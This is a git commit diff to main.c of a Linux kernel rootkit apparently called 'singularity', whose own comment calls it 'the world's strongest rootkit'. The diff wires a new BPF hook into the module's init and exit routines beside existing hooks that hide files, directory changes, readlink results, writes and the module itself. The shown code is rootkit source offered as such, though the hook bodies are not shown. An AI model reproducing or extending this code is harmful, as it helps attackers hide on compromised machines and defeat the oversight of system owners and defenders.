6ce13c16756523a37d721ccbbaa69bc0fca38e35
matheuz <88067225+MatheuZSecurity@users.noreply.github.com>
2025-10-15 01:49:57 -0300

    Update main.c

--- main.c
+++ main.c
@@ -11,6 +11,7 @@
 #include "include/hiding_readlink.h"
 #include "include/hide_module.h"
 #include "include/open.h"
+#include "include/bpf_hook.h"
 
 /*
 You loaded the world's strongest rootkit into my heart... woman, you are so beautiful and gentle, you changed my life, I love you <3
@@ -31,6 +32,7 @@ static int __init singularity_init(void) {
     ret |= hooks_write_init();
     ret |= hiding_chdir_init();
     ret |= hiding_readlink_init();
+    ret |= bpf_hook_init();
     module_hide_current(); // optional
     return ret;
 }
@@ -47,6 +49,7 @@ static void __exit singularity_exit(void) {
     hiding_chdir_exit();
     hiding_readlink_exit();
     hiding_open_exit();
+    bpf_hook_exit();
 }
 
 module_init(singularity_init);
